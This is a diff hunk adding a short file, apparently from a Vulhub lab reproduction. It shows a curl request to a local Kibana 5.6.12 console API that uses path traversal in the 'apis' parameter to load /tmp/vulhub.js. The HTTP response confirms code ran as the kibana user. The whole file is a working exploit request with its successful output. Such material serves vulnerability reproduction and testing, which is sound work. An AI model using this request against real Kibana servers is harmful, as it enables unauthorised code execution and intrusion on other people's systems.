@@ -1,0 +1,13 @@
+$ curl -i "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/vulhub.js"
+
+HTTP/1.1 200 OK
+content-type: application/json; charset=utf-8
+kbn-name: kibana
+kbn-version: 5.6.12
+cache-control: no-cache
+content-length: 96
+accept-ranges: bytes
+Date: Wed, 28 Oct 2026 03:56:00 GMT
+Connection: keep-alive
+
+{"../../../../../../../tmp/vulhub.js":"uid=1000(kibana) gid=1000(kibana) groups=1000(kibana)\n"}
